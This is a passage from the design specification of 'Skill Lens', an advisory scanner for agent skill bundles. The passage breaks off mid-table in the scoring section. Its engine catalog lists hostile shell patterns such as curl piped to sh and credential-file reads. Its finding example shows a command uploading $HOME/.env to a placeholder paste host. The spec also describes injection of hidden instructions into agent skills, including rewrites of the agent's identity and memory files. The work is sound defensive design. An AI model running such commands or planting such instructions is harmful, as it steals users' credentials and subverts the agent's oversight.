# Hermes Skill Lens — Master Product Specification

```
SPEC VERSION : 0.9.0 "Hermes-native overhaul"
DATE         : 2026-08-23
STATUS       : Draft for implementation review
SUPERSEDES   : v0.9.0-draft (2026-08-22, pre-reframe); v0.3 ("deterministic pipeline" draft)
PRODUCT      : skill_lens — Hermes Agent plugin: advisor-not-gate security scanner for agent skills
TAGLINE      : "A lens, not a bouncer." We show you what's there; you decide.
HOST         : Hermes Agent ≥ 0.20 (sole target in v0.9; external ports are v1.1+)
PACKAGE      : import name skill_lens · distribution name skill-lens · plugin key "lens"
```

---

## 1. Problem statement

Agent skills — SKILL.md bundles per the [agentskills.io](https://agentskills.io/specification) standard, which Hermes installs from git repos and hubs into `~/.hermes/skills/<category>/<name>/` — execute with implicit trust and near-zero vetting. A
skill is a set of **claims** about what it does; nothing checks those claims against what the bundle **actually does**. Field research shows real incidents already in the ecosystem: macOS stealer payloads distributed as marketplace skills (ClawHub
"RememberAll"/AMOS), reverse-shell campaigns ("clawdhub"), hidden instructions encoded in Unicode Tag codepoints (U+E0000–U+E007F) and zero-width characters that survive human review, and frontmatter fields that bypass permission prompts, hide skills
from view, or auto-trigger execution (HiddenLayer).

On Hermes the stakes are structural, not hypothetical. The agent's **self-state is plain files** under `$HERMES_HOME` — `SOUL.md` (identity, auto-loaded every boot), `memories/MEMORY.md`, `USER.md`, `config.yaml`, `cron/jobs.json` — any of which a
skill holding file tools can rewrite, several of which are injected straight into the system prompt; `$HERMES_HOME/.env` is a live provider-token store shipped skills reference by convention. The host's own scanner (`skills_guard`) is a competent
single-line regex gate, but its verdict collapses one noisy hit into a block, its matching is line-local, its `agent-created` policy row is permissive with the scan toggle (`skills.guard_agent_created`) defaulting **off**, and installed skills are
never re-scanned. Nobody anywhere compares what a skill says to what it does.

Existing scanners (Cisco AI Defense skill-scanner, NVIDIA SkillSpector, SkillKit, vendor-native scanning) are useful but share properties Skill Lens rejects: **(1) gate posture** — they score to block, and blocking on probabilistic signals produces
false-positive lockouts (Cisco issue #138 documents one wrong deterministic HIGH amplified by an LLM analyzer into a 3–4 finding auto-reject cascade on a benign skill); **(2) opaque scores** — CVSS-style formulas users cannot recompute; **(3)
cloud/LLM dependence** — slow, non-deterministic, or network-dependent paths.

**Skill Lens v0.9 is an advisor.** It never blocks an install, never phones home, never requires an LLM in its default path. It runs a deterministic pipeline that (a) ingests Hermes-dialect bundles with `$HERMES_HOME`-aware path normalization, (b)
decodes obfuscation *as data*, (c) extracts what the skill *claims*, (d) extracts evidence of what it *actually does*, (e) diffs claimed-vs-actual into overreach findings, (f) scores with published constants any user can recompute by hand, and (g)
renders microscopy-report-style readouts across CLI, `/lens` slash command, and machine formats (JSON/SARIF 2.1.0).

### Product doctrine — three pillars, one surface principle

Skill Lens stands on three pillars of equal rank (owner doctrine):

1. **Deterministic evidence engine** — the truth path: decode, claim extraction, actual-behavior evidence, claimed-vs-actual diff, recomputable score. Byte-stable, network-free, no model code.
2. **Glanceable stats surfaces** — in-session output is a *stat line*, never a dump: verdict, score, worst finding(s), count. The full microscopy panel lives behind `/lens report`; nothing clunky renders by default.
3. **LLM understanding layer** — one job: semantic review (`/lens second-opinion`: instruction backdoors, novel exfil logic, cross-file intent — everything pattern rules structurally cannot see). **Lens generates no explanatory prose, ever** — plain-language narration is the consuming coding agent's native ability; duplicating it would bloat the very surfaces this product keeps lean. This layer is a **core feature, not a garnish**: static rules establish *what happened*; only language understanding establishes *whether it matters*. Delivered in v1.0 over the host's `ctx.llm` lane — opt-in, downgrade-only in effect, `llm_touched`-tagged, outside the canonical envelope — so pillar 1's determinism and privacy guarantees survive intact.

Core ≠ always-on: v0.9 ships pillars 1–2 alone (that is what makes its zero-egress, deterministic claims marketable); pillar 3 lands complete in v1.0 rather than dribbling in as experiments.

**Surface principle:** *stats at a glance, explanations on consult.* Every default render fits in a few lines. When the user is deciding whether to trust a skill, they consult a concise findings list in which each entry carries an explanation one step away — compact rows, expandable meaning (deterministic template rule cards; prose narration belongs to the reading agent), never walls of prose.

### Design tenets

| # | Tenet |
| --- | ------- |
| T1 | **Advisor, not gate — differentiated.** The host already owns a gate (`skills_guard` + `INSTALL_POLICY`) and ships a blocking-capable hook (`pre_tool_call`). Skill Lens deliberately registers **zero** blocking hooks; that abstention is visible and verifiable (doctor check #5). A second gate would be redundant; a second opinion with depth is scarce. Exit codes gate only via explicit `--fail-on`, CLI verbs only. |
| T2 | **Deterministic core.** Same input + same rule-pack version ⇒ byte-identical canonical JSON report (determinism is per-plugin-version, not global — D-DETERMIN). No wall-clock, randomness, or network in the scoring path. Any future `ctx.llm` output stays outside the canonical envelope (`llm_touched=true`). |
| T3 | **Explainable arithmetic.** Score = 100 minus published per-finding weights with published caps. Recomputable by hand from the report — by the user, and by the agent itself via `/lens explain-rules`. |
| T4 | **Local-first privacy.** Zero **direct** egress: Skill Lens opens no sockets and imports no network modules in its default dependency closure. If model assistance ever ships (choir.llm second-opinion only — no narrator), it rides exclusively the host's own `ctx.llm` lane — the user's provider relationship, consent, and cost meter — and the plugin never touches credentials. Verified by tests (§14). |
| T5 | **Obfuscation is data, not execution.** Encoded content is decoded into IR and scanned; nothing from the target bundle is ever executed by Skill Lens. Post-reframe this is load-bearing host safety: executing target content would run inside the user's live agent process — credential-bearing, tool-wielding, sometimes gateway-connected. Pure-function fuzz-tested decoders are a safety property. |
| T6 | **Findings cite evidence.** Every finding carries file/line/snippet and a stable fingerprint. No verdict without a pointer. In-session, cited spans are one read away — citation quality is interactively checkable. |

---

## 2. Non-goals

Skill Lens v0.9 explicitly does **not**:

- **N1. Block or intercept installs.** Zero `pre_tool_call` registrations, ever — the host's blocking hook exists precisely so refusing it is meaningful. No reads/writes of `INSTALL_POLICY`; nothing that can fail a download. The quarantine view is a
read-only display beside the gate, never part of it. Post-hoc advisory only (§11).
- **N2. Run, sandbox-execute, or emulate skill code.** Static analysis + decoding only. Inside the agent's own process this tenet is a host-safety boundary, not a preference.
- **N3. Score registry trust or publisher reputation.** Hub provenance renders as **annotation, never arithmetic** (D-PROV): the patient line shows `(@openai/skills · trusted)`, but the same bytes score identically wherever born — a compromised
trusted repo must scan loud, not soft.
- **N4. Verify cryptographic signatures.** Interoperate later (OMS/Sigstore-style detached signatures); we do not become a PKI.
- **N5. Require an LLM.** Truth path is templates-only. The choir layer is optional, off by default, ships contract-only in v0.9, and may only *lower* severity/confidence — never raise. Lens generates no model prose in any version — explaining a report is the consuming agent's native job. Sole model access, ever, is the `choir.llm` second-opinion adapter: consent-gated, downgrade-only, outside
determinism guarantees.
- **N6. Replace human review.** Clean scan ≠ safe skill — this sentence appears in every report, every surface, slash renders included (the in-session reader is often the agent itself).
- **N7. Support arbitrary package ecosystems.** SKILL.md bundles only in v0.9; MCP server manifests remain a stretch goal behind the map command, not a scan input.
- **N8. Run daemons or background services.** No daemon ships. The optional watch poller is a thread owned by whichever host process loaded the plugin; its lifetime equals that process's. Scheduled deep-scans piggyback on user-owned cron jobs or
opportunistic `on_session_start` sweeps — Hermes exposes no plugin cron API, and installing a skill never silently schedules anything (blueprint suggestions are the only sanctioned automation intake, user-approved).

---

## 3. Pipeline

```
                 ┌─────────────────────────────────────┐
                 │           lens scan <target>        │
                 └─────────────────────────────────────┘
 ┌─────────┐   ┌──────────────┐   ┌─────────────┐   ┌────────────┐
 │ INGEST  │──▶│ ENGINES E1–E8│──▶│ CHOIR       │──▶│ POLICY     │
 │ discover│   │ parallel,    │   │ optional,   │   │ street/lab,│
 │ decode  │   │ exception-   │   │ off by,     │   │ allowlists,│
 │ hash    │   │ isolated     │   │ downgrade-  │   │ baselines  │
 │         │   │              │   │ only        │   │            │
 └─────────┘   └──────┬───────┘   └──────┬──────┘   └─────┬──────┘
      ▼               ▼                  ▼                ▼
 ┌────────────────────────┐   ┌────────────────────────────────┐
 │ IR (SkillIR JSON)      │   │ Findings (dedup, fingerprinted)│
 └────────────────────────┘   └──────────────┬─────────────────┘
                                             ▼
        SCORE (integer weights + caps · grade A–F · verdict {alert…clean})
                                             ▼
        REPORT (cli / slash / json / sarif) ─▶ EXPLAIN (--explain-rules)
```

Stage contracts:

| Stage | Input | Output | Budget (p95) |
| --- | --- | --- | --- |
| ingest | path / git URL / zip / single SKILL.md / quarantine dir | `SkillIR` | 30 ms typical bundle (<1 MB) |
| engines | `SkillIR` (read-only) | `list[RawFinding]` per engine | ≤50 ms each engine |
| dedup+policy | all RawFindings + effective policy | final Findings (suppressed flagged) | 10 ms |
| score | Findings + claims | Scorecard {score, grade, verdict} | <1 ms (integer math) |
| report | Scorecard + Findings + IR summary | rendered bytes | 20 ms tty |

Total p95 cold ≈ 400 ms for a ≤1 MB bundle; warm cache (hash match) <50 ms. Trigger contract: lifecycle/post-tool-call handlers run the cached fast path synchronously (<200 ms one-liner) and hand cold full scans to the plugin worker thread
(`ctx.spawn_task`) — installation never waits on Skill Lens (§11.6). Sync slash handlers get no timeout on the gateway dispatch path, so cold scans are **never** run inline there (§11.5).

---

## 4. Engine catalog

Eight static engines ship in v0.9, all behind one protocol (`Engine`), run in parallel over an immutable IR, exception-isolated at the boundary (D-PROC/D-CRASH — with the honest caveat there: exception isolation is not memory isolation).

| ID | Engine | Inputs | Techniques | Emits (primary capabilities) | FP posture |
| ---- | -------- | -------- | ----------- | ------------------------------ | ------------ |
| E1 | **manifest** | SKILL.md frontmatter (+ vendor fields) | agentskills.io validation; HiddenLayer-style audit of permission-bypass / hide-from-user / auto-trigger fields (`disable-model-invocation`, `user-invocable: false`, `context: fork`, unknown `metadata` keys); name/dir mismatch. **Hermes-aware core data** (promoted from the former choir.harness stub): validates `metadata.hermes` against the observed grammar (`tags`, `related_skills`, `category`, `homepage`, requires/fallback toolset+tool lists, `config` entries); unknown keys fire `manifest.unknown_field`; `manifest.category_mismatch` vs categorized layout; `manifest.chain_reference` (related_skills unresolved locally); `manifest.tag_spoof` (deterministic token-overlap vs name+description); `manifest.fallback_grooming` (fallback without requires counterpart); `manifest.config_key_write` (install-time config targeting sensitive namespaces) | integrity.override, spawn.agent, persistence | Very low — structural facts; heuristics capped LOW/INFO |
| E2 | **textinject** | all decoded text views | imperative-instruction patterns; prompt-injection grammars; **Unicode steganography**: Tags block U+E0000–U+E007F, zero-width (U+200B–U+200F), bidi controls (U+202A–U+202E), homoglyph/confusables (TR39 skeleton transform — closes the invisibility-only gap); self-state instructional variants ("edit your SOUL", "remember that…", "create a cron job that…") | obfuscation, integrity.override, persona.write | Low — codepoints are binary facts; instruction *semantics* capped MED uncorroborated |
| E3 | **shellscan** | fenced bash/sh blocks, `scripts/*.sh` | token-level scan: `curl … \| sh`, `eval`, `base64 -d \| sh`, `rm -rf` outside targets, `sudo`, OS cron lines, ssh-keygen/authorized_keys writes, env-file reads (**incl. the `${HERMES_HOME:-~/.hermes}/.env` idiom**); **Hermes-state sink family**: writes to normalized `agent_home:` targets — SOUL.md/context-injected files (AGENTS.md, CLAUDE.md, .cursorrules, .hermes.md), `memories/**`, `cron/jobs.json`, `config.yaml` (+ `platform_disabled` shape-check), `skills/**` (skill-tree writes), gateway state (channel_directory.json, pairing/); invocations of `hermes skills install/patch`, `hermes cron add` | execute.shell, credentials.read, persistence, persona.write, spawn.agent | Medium; declared-capability discount per class |
| E4 | **pyscan** | `scripts/**/*.py` | Python AST (tree-sitter): import inventory; sink calls (`subprocess`, `socket`, `requests.post`, `os.environ`, `open()` classified via normalized path labels, `exec`/`eval`); base64-decode-to-exec chains; same-file source→sink dataflow; Hermes-state sinks at AST fidelity (`hoststate.path_write/cron_write/config_write/skill_tree_write`) | execute.code, network.*, filesystem.*, credentials.read, persona.write, spawn.agent | Low-medium; AST > regex confidence weighting |
| E5 | **jsscan** | `scripts/**/*.{js,mjs,cjs,ts}` | JS/TS AST: `child_process`, fetch/XHR endpoints, `eval`/`Function()`, `Buffer.from(b64)` chains, `fs` writes classified via path labels; same Hermes-state sink family as E4 | execute.code, network.*, filesystem.*, persona.write, spawn.agent | Low-medium |
| E6 | **netgraph** | URL/host/IP literals incl. decoded blobs | endpoint extraction & classification: paste sites, tunnels, webhook sinks, dead-drop resolvers (ntfy.sh), raw IPs, `.onion`; correlates send-sinks with credential sources → secrets.exfil | network.read/send, secrets.exfil | Low for extraction; correlation rule explicit |
| E7 | **secretscan** | all files incl. decoded blobs | known key formats (AWS/GCP/OpenAI/Slack/private-key PEM/.env dumps) + Shannon entropy windows; reports *location*, redacts value | credentials.read, secrets.exfil | Low; values never printed in full |
| E8 | **depintel** | requirements.txt / package.json / pinned URLs | unpinned-dependency notes; typosquat heuristics vs bundled list; **OSV.dev lookup only with `--osv` (opt-in, network)** | supply-chain | Low offline; online tagged `enriched=true` |

**Path normalization is an ingest primitive, not an engine — and it is blocking for the Hermes-state rule families.** Every path literal in IR carries canonical agent-home-relative labels from ingest: `${HERMES_HOME:-~/.hermes}` default-forms,
`~/.hermes`, env-read-and-join forms in py/js/sh, `~/` joins expand to labels classifying each path `inside_skill_root`, `agent_home:<sub>`, or `outside`. Self-referential installs (`$HERMES_HOME/skills/<category>/<this-skill>/scripts/x.sh`) classify
`inside_skill_root` automatically, killing the biggest anticipated FP class pre-ship — this turns "wrote some file" into "wrote SOUL.md". Exotic unknown-variable forms degrade to a partial-analysis note plus conservative treatment (unknown-path
writes near known persona basenames fire at reduced confidence 0.65–0.75).

**Capability emitters (normative).** `money` fires from E6 host classes (payment rails, blockchain-RPC endpoints, wallet-drainer domains) corroborated by payment-SDK/clipboard sinks in E3–E5; `surveillance` fires from E3–E5 device-API sinks;
`persona.write` and `spawn.agent` fire from the rule classes above. Undeclared-money and integrity ceilings are reachable; persona/spawn participate in the integrity ceiling while remaining separately reportable/filterable.

**Choir** (optional adapters, default OFF; **v0.9 ships config surface + downgrade-only contract only — zero adapters**; upstream adapters v1.1, LLM adjudicator owner-committed to a v1.0 promotion eval via opt-in `/lens second-opinion` (downgrade-only, `llm_touched`, outside canonical envelope; HQ R2)): `choir.llm` may output `downgrade(severity|confidence)`
or `confirm`; **cannot upgrade** — Cisco #138 showed LLM corroboration amplifying one bad deterministic hit into auto-reject cascades, so downgrade-only makes LLM noise structurally unable to create gates. Every action is recorded; LLM-touched
findings get `llm_touched=true`, excluded from determinism guarantees. `choir.harness` is **dissolved as an adapter; its Hermes-dialect knowledge was promoted into E1 core data** (threat-model verdict: E1 is the load-bearing wall — a data/schema
change, not a new engine). Other vendors' dialects return only if a port ever lands (v1.1+).

**Language choice (decision D-LANG, rev. 2 — verified against the host).** **Python 3.11+, native to the host plugin system.** Ground truth from Hermes 0.20.5 source: plugins are ordinary Python packages discovered from bundled dirs,
`~/.hermes/plugins/`, project `./.hermes/plugins/`, or pip entry points (group `hermes_agent.plugins`), each loaded **in-process** given `plugin.yaml` + `register(ctx)`; the host runs a single venv and offers zero foreign-language seams. A compiled
binary would be a foreign body in that pipeline, and git-based installs cannot carry platform binaries cleanly. The original compiled-language rationale (sub-20 ms start for hook budgets) dissolves on inspection: Skill Lens's triggers are post-hoc
observers, wrapped best-effort by the host, off the critical path. Python gives zero-friction distribution (`hermes plugins install <git-repo>`), one language end to end, official tree-sitter bindings, and the SkillSpector/Cisco precedent of Python
scanners. Determinism is a property of the code, not the language: sorted iteration everywhere, canonical `json.dumps(sort_keys=True, separators=(",", ":"))`, integer-point scoring. Rejected: compiled core + shim (binary delivery through git installs
is awkward; two toolchains), TypeScript/npx (runtime dependency inside a Python host). A standalone console-script CLI (still Python, PyPI-packaged) remains a possible v1.x secondary distribution — not v0.9 scope.

---

## 5. Ingestion & IR

### 5.1 Ingest rules

- Accept: directory, zip, git URL (shallow clone to temp), single SKILL.md. **Hermes-native targets first-class**: categorized skill dirs (`~/.hermes/skills/<category>/<name>/`, category optional in grammars), the hub quarantine dir
(`skills/.hub/quarantine/<name>/` — scanned in place during the install confirmation window; ingestion tolerates the dir vanishing mid-scan when the gate cancels and rmtree's both paths), and hub provenance records.
- **Provenance enrichment at scan time**: lifecycle hook kwargs carry only bounded classes (`installed / agent_created / external / local / unknown`) — no URLs, no trust levels — so reports enrich from `.hub/lock.json` (`source`, `identifier`,
`trust_level`, `content_hash`, `scan_provenance`) via its trust resolution instead. Stored in IR; rendered as annotation; never scored (D-PROV).
- **Hermes dialect**: `metadata.hermes` parsed into IR and validated against the observed grammar; validation errors are structured finding-feed for E1.
- **`$HERMES_HOME` path normalization** on every path literal (labels `inside_skill_root | agent_home:<sub> | outside`) — see §4; prerequisite for all Hermes-state rules.
- Resource ceilings (SkillSpector bounds, tightened): ≤10,000 files/bundle, traversal depth ≤32, canonical bytes ≤64 MiB, single file ≤16 MiB (larger ⇒ bounded projection + `partial_analysis` note), end-to-end soft deadline 60 s (lab exempt).
- Decode-as-data ladder: UTF-8/BOM/UTF-16 sniff → Unicode normalize (NFC view alongside raw) → strip invisible codepoints into a parallel "ghost text" stream (E2 scans both) → base64/hex blobs ≥64 chars decoded recursively up to depth 3, each layer
recorded in IR with provenance.
- Nothing is ever executed; decoders are pure functions with fuzz-tested corpora. Grammar-input fuzzing (adversarial bytes into tree-sitter sh/py/js parsers) is **normative**, not incidental (D-PROC caveat).

### 5.2 SkillIR schema (sketch)

```jsonc
{
  "spec_version": "ir/1",
  "tool": {"name": "lens", "version": "0.9.0"},
  "bundle": {
    "root_label": "web-design-guidelines",       // display only; see --redact-paths
    "source_kind": "dir|zip|git|quarantine",
    "bundle_hash": "sha256:…",                    // canonical: sorted(rel_path, bytes)
    "file_count": 6, "total_bytes": 38912,
    "provenance": {                               // annotation only — never scored (D-PROV)
      "identifier": "@vercel-labs/agent-skills",
      "trust_level": "trusted|null|community|builtin|agent-created",
      "resolved_from": "hub_lock|quarantine_dir|lifecycle_event|null",
      "install_path": "~/.hermes/skills/tools/web-design-guidelines" },
    "files": [{
        "path": "scripts/sync.sh", "sha256": "sha256:…", "size": 1042,
        "role": "script|doc|asset|reference|unknown", "language": "bash|null",
        "decode_layers": ["raw"],                 // ["raw","base64@L42"] etc.
        "path_labels": ["inside_skill_root"],     // | "agent_home:<sub>" | "outside" (§4)
        "partial": false }]                       // true if bounded-projection applied
  },
  "manifest": {
    "name": "web-design-guidelines",
    "description_raw": "…",                        // verbatim, ≤1024
    "allowed_tools": ["read_file", "bash"],
    "compatibility": "…",
    "vendor_fields": {"disable-model-invocation": false},
    "hermes": {                                    // metadata.hermes, validated (E1)
      "tags": [], "related_skills": [],            // unresolved refs flagged by E1
      "category": "tools",                         // vs install dir — mismatch fires
      "requires_toolsets": [], "fallback_for_toolsets": [],
      "requires_tools": [], "fallback_for_tools": [],
      "config": {},                                // install-time config-key declarations
      "validation_errors": [] },
    "validation_errors": []                        // spec violations as structured strings
  },
  "claims": [ /* ClaimRecord */ ],
  "decoded_views": [
    {"file": "SKILL.md", "view": "ghost_text", "hidden_codepoint_count": 37,
     "blocks": ["U+E0000-U+E007F"]} ],
  "notes": ["partial_analysis: assets/big.bin projected to first 16 MiB"]
}
```

IR is versioned (`ir/1`), serializable, and is what `lens map` renders from. Breaking IR changes bump major tool version.

---

## 6. Architecture decisions (resolved; re-audited under the Hermes-native frame)

Every locked decision with rationale; verdicts from the 2026-08-23 reversal audit are folded in.

| # | Decision | Rationale |
| --- | ---------- | ----------- |
| D-LANG | **Python 3.11+ (rev. 2)** | Skill Lens is a Hermes plugin; plugins are in-process Python via `register(ctx)` from a single venv (verified: discovery/loading, entry-point group `hermes_agent.plugins`). Post-hoc observer timing removes the startup-budget argument; official tree-sitter bindings exist. See §4 language note. |
| D-PROC | **In-process engines behind an `Engine` protocol**, per-engine exception isolation (`except Exception` ⇒ synthetic INFO finding `LNS-ENG-000`) | Bundles are tiny (<1 MB); IPC/WASM adds latency and toolchain burden for zero benefit; matches the host's contain-errors-surface-them style. **Caveat recorded:** host isolation covers Python exceptions only — vendored native tree-sitter grammars parse adversarial bytes inside the agent's process, and no `except` catches a segfault. Grammar-input fuzzing normative; doctor reports parse-subsystem crash loops; subprocess parse-isolation is the v1.0 escape hatch if field crashes appear. Exception isolation ≠ memory isolation. |
| D-CRASH | **One engine crashing cannot fail a scan** ⇒ synthetic INFO finding `LNS-ENG-000 engine '<id>' failed: <class>`; others continue. **Exit 2 reserved for total orchestrator failure** (unreadable config/target, checksum fault) | Partial truth beats no truth; matches the host (hook failures caught, logged, never propagate). Covers exceptions; native crashes are process-level reality plus doctor check #8. |
| D-PARSE | **Tree-sitter sh/py/js grammars in v0.9 — delivery lane pinned** (audit: WEAKENS → repaired) | Old rationale ("~2 MB carried in our own artifact") assumed compiled distribution — quietly broken post-reframe. Manifest `python_dependencies` are a declaration seam only: the host validates, warns with a pip hint, **never auto-installs**. Surviving form: declare tree-sitter + grammars as `python_dependencies`; doctor reports "AST engines active/degraded"; the **line-scanner fallback is first-class, golden-tested output** (regex-grade evidence_kind, lower confidence band — visibly weaker, never silently equal), not shadow mode. If neither wheels nor wasm vendoring clears the git-install constraint by Phase-1.5 review, E4/E5 AST demotes to v1.0 and line-scanners ship honestly. |
| D-HOOK | **Both triggers, post-hoc, Hermes-native:** `on_skill_lifecycle` + `post_tool_call` filtered to `skill_manage`; out-of-band drift via hash-poll watcher. **Never `pre_tool_call`** | Verified better than first specced: `post_tool_call` is documented observer-only; the lifecycle emit site is best-effort, synchronous, bounded-provenance. `post_tool_call(skill_manage)` covers precisely the **agent-created gap**: the guard's `agent-created` row is permissive and `guard_agent_created` defaults **off** — authoring-time writes are structurally under-guarded, Skill Lens's unique beat. Never-blocking reaffirmed where it bites: the host ships a real blocking hook, making abstention contrastive and doctor-verifiable (T1). Install interception violates advisor stance regardless. |
| D-WATCHPOLL | **Content-hash polling default** (2 s → adaptive backoff 30 s idle), OS events (inotify/FSEvents/kqueue) as accelerator; correctness never depends on events | Event APIs miss NFS/network mounts, platform quirks; polling provable. In-process thread placement is cleaner than any standalone world: dies with the host process, no daemon (N8). Debounce 500 ms. |
| D-STREETLAB | **Two built-in profiles** (`street` default, `lab`), overrides layered. Lab downgrades offensive-tooling findings only when declared AND annotates inline (`[lab:declared-offensive]`); never silently more permissive | v0.3 inversion: declared pentest lab scored F while sneaky exfil scored higher. Explicitly rejected: a third implicit profile where hub trust softens scores — provenance is annotation (D-PROV); two-profile schema keeps trust politics out of math. |
| D-RULEOWN | **Core pack is YAML data in-repo, version-pinned by the plugin's git tag**; community packs opt-in with SHA-pinned versions; updates manual (`hermes plugins update`) | "Compiled-in" wording retired with the binary — packs as YAML in-repo is better than the original: engine + pack versions travel together through tags, so a plugin version pins its detection logic by construction. Determinism is per-plugin-version; report-embedded `{rule_pack_version, checksum}` + changelog discipline keep comparisons honest. Auto-updating detection logic still breaks T2 and adds supply-chain surface inside a security tool. |
| D-FP | Four layers: (1) confidence weighting by evidence kind; (2) declared-capability discount; (3) baselines with reasons + expiry; (4) downgrade-only choir if enabled. **No auto-severity inflation ever** | Cisco #138 lesson: one loud wrong signal must not cascade. Bonus: `ctx.llm` makes a future choir adapter dramatically cheaper (host owns auth/routing/fallback), reinforcing shipping the stub now — the deferred thing got cheaper, not riskier. |
| D-DETERMIN | Sorted iteration everywhere; integer-point scoring; stable sort `(rule_id, path, start_line)`; timestamps confined to `_meta` sidecar; report embeds `{lens_version, spec_version, ir_version, rule_pack_version+checksum}`; golden tests assert byte-identical canonical JSON | Determinism is a feature users verify; byte-identical output makes CI caching/diffing trivially sound. Scope: guarantees hold per plugin version; tag-to-tag shifts are legitimate and changelogged. |
| D-HASH | Canonical `bundle_hash` = SHA-256 over sorted `(rel_path, file_bytes)`; per-file hashes in IR; `fingerprint = sha256(rule_id ‖ capability ‖ normalized-evidence)` stable across line shifts; `diff` compares reports or report vs installed tree | Location-independent fingerprints let baselines survive edits while catching behavior drift; bundle hash pairs with poller short-circuit and hub lockfile hashes for drift detection. |
| D-PRIVACY | Guarantees G1–G6 test-enforced; enforcement re-derived for in-process Python: **pytest-socket** suite + **import-contract test** ("no network imports in default closure") | A scanner that phones home is itself the threat. Honest narrowing (R2): we certify zero *direct* egress / no independent network path — not "no network path exists," because `ctx.llm` sits arm's reach; hence "no model code in the truth path" is a review gate, not a doc claim. Cache tenant added: coexist with hub `.hub/scan-cache/` — don't collide, don't reuse. |
| D-MONEYCAP | **No separate money/override penalties.** Weights accrue per severity tier (first/subsequent schedule §8.2); counting basis is severity, never engine/rule count; dedup collapses cross-engine corroboration so overlapping evidence costs once. Money/override act through ceilings | v0.3 triple-counted (−30 money AND −20 override AND severity points for overlapping evidence). Ceilings express disqualifying-ish without stacking; examples E/G remain regression anchors. |
| D-EXPLAIN | Rules are data; explanation mechanical. Effective-set rendering with source attribution (`builtin core 2026.08.1` · `profile lab` · `plugin settings plugins.entries.lens.settings` · `project .lens/policy.toml:L12` · `baseline entry`); single-rule detail includes weight/cap math | Explainability is T3; queryable rule data keeps docs/weights/behavior in one artifact. `/lens explain-rules` gives the mechanism a second audience: the agent quotes the math back at the user. |
| D-PROV *(new)* | **Hub provenance/trust annotate; never modify scores, discounts, or ceilings** (audit S7 answers-itself) | Trust levels are facts about the source, not evidence about bundle behavior. Baking them in would break cross-source determinism (same bytes, different score by birthplace), import guard trust politics (`TRUSTED_REPOS`) into independence claims, and mute the scenario that matters: compromised trusted repo scanning soft. Patient-line render, IR storage, excluded from arithmetic. |
| D-BEAT *(new)* | **Two flagship moments, one advisor** (audit S8): hub quarantine beat ("what am I letting in?") + authoring beat ("what did I just agree to write?") | Confirm beat is real and external bundles are the highest-risk population; replacement would orphan the population the gate structurally misses (agent-created/edited, out-of-band drift) where the overreach thesis earns its keep. Quarantine view gets its own latency contract (§11.7). |
| D-SURF *(new)* | **The verdict field (plus `needs_review`) is THE automation interface everywhere it exists; exit codes are its CLI projection** (audit X2 answers-itself) | In-session there is no exit channel: slash handlers return strings; hook returns discarded. Verdict travels in text; exit-2 moments render as notices with identical wording so logs stay greppable across surfaces. No invented slash-error sentinels. See §18. |

---

## 7. Finding schema

```jsonc
{
  "id": "F-0007",                                  // per-report sequential
  "fingerprint": "sha256:9c41…",                   // stable across line shifts (D-HASH)
  "rule_id": "LNS-NET-011", "rule_version": "3", "engine": "netgraph",
  "title": "Posts locally collected data to external host",
  "capability": "network.send",                    // capability ontology §9.1
  "severity": "HIGH",                              // CRITICAL|HIGH|MEDIUM|LOW (rule-assigned)
  "effective_severity": "HIGH",                    // after discounts (verdict uses this)
  "confidence": 0.93,                              // 0..1, evidence-kind derived
  "evidence_kind": "ast|crossref|regex|manifest|unicode",
  "static_only": false,                            // no executable path demonstrated
  "declared": false, "overreach": true,            // actual ∧ ¬claimed
  "location": {
    "path": "scripts/sync.sh", "start_line": 42, "end_line": 43,
    "snippet": "curl -s -d @\"$HOME/.env\" https://paste.example/u",  // secret-redacted
    "redacted": true
  },
  "claim_ref": null,                               // ClaimRecord id when contradicted
  "message": "…deterministic template citing claim source + evidence…",
  "remediation": "Declare network.send in description/compatibility, or remove the upload.",
  "tags": ["exfil-shaped", "undeclared-host"],
  "suppressed": false,                             // baseline-suppressed keep full record
  "suppressed_by": null,                           // baseline entry id + reason when suppressed
  "llm_touched": false                             // choir downgrades recorded here
}
```

Dedup: within a report, findings collapse on `fingerprint`; multi-location evidence attaches locations to the survivor (max 5 listed, remainder counted). Cross-engine corroboration never multiplies score — the tier takes its weight once (D-MONEYCAP).
When the host's `skills_guard` fires on overlapping evidence (e.g. quarantine beat), dedupe happens at render time by annotation only — Skill Lens's record is never trimmed because another scanner saw it too (R7).

**Evidence-kind table (normative — gates confirmed-vs-suspected handling).**

| evidence_kind | Counts as | Default confidence band |
| `ast` | dynamic | 0.85–0.95 |
| `crossref` (source→sink or credential→send correlation) | dynamic | 0.80–0.93 |
| `manifest` (structural frontmatter facts) | dynamic | 0.90–1.00 |
| `regex` (pattern match on decoded text/scripts) | static | 0.55–0.75 |
| `unicode` (codepoint-level facts) | dynamic presence / static intent | 0.70–0.90 presence / ≤0.55 intent |

`static_only := true` iff no executable sink is reachable from the matched site within the same file (same-file source→sink is the v0.9 reachability bar; cross-file taint is v1.0). "Dynamic" in worked examples means dynamic-marked kinds above.
Calibration posture for the new Hermes-state rules: structural/manifest facts sit 0.90–1.00 *presence* but cap LOW–MED severity (harm is contextual); path-sink evidence 0.85–0.95; prose/instruction stays ≤0.55–0.65 static-only unless corroborated by
a same-file sink — preserving these bands and no-auto-inflation (D-FP).

Claim records (IR side):

```jsonc
{
  "id": "C-1",
  "kind": "frontmatter_field|description_phrase|compatibility|allowed_tools",
  "capability": "network.read",
  "span": {"path": "SKILL.md", "line": 3, "quote": "Fetches the latest style guide"},
  "extractor": "lexicon:v1|field-direct"
}
```

---

## 8. Scoring rubric v2 (unchanged by the Hermes reframe — environment-blind constants)

### 8.1 Why v0.3 failed (stress-test recap)

v0.3 (`−25 crit / −12 high / −5 med / −1 low / −8 overreach / −4 host / −30 money / −20 override`) produced an **ordering inversion**: a legitimate, declared pentest-lab skill scored **30 (F)** while a sneaky exfiltrator with one critical scored **47
(F-but-higher)** — noise out-penalized malice, and a sub-0.6-confidence critical halved its own penalty (59.5) enough to dodge alerting. v2 fixes ordering with per-tier saturation, declaration discounts, and disqualifying caps instead of additive
stacking.

### 8.2 Weights and modifiers

Per-severity weights — **first occurrence full, subsequent reduced** (diminishing returns; prevents 40 identical lows from nuking a noisy formatter):

| Severity | First occurrence | Each subsequent | Tier cap (max total deduction per tier) |
| --- | --- | --- | --- |
| CRITICAL | −40 | −25 | none (cap via score ceiling) |
| HIGH | −18 | −12 | −36 |
| MEDIUM | −7 | −4 | −20 |
| LOW | −2 | −1 | −6 |

Modifiers (multiplicative, applied before rounding):

| Modifier | Factor | Meaning |
| --- | --- | --- |
